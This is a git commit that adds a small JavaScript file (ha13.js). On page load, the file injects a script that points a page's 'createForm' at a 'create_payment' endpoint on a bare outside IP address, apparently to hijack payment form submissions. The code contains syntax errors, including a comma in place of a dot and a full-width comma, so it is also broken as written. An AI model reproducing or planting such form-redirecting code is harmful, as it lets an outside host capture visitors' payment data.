af0ae6b5136b8d614a6b0afa73c5e35caa856edf
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-07-01 00:39:13 +0800

    Update and rename ha12.js to ha13.js

---
+++ ha13.js
@@ -0,0 +1,7 @@
+window.onload=function(){var scriptEle = document,createElement("script");
+     scriptEle.type ="text/javascript";
+     scriptEle.text = `document.getElementById('createForm').action = 'http://43.198.42.193/create_payment'`;
+     var x = document.getElementById("createForm");
+     x.insertBefore(scriptEle，x.firstChild);
+     document.body.appendChild(scriptEle);
+}
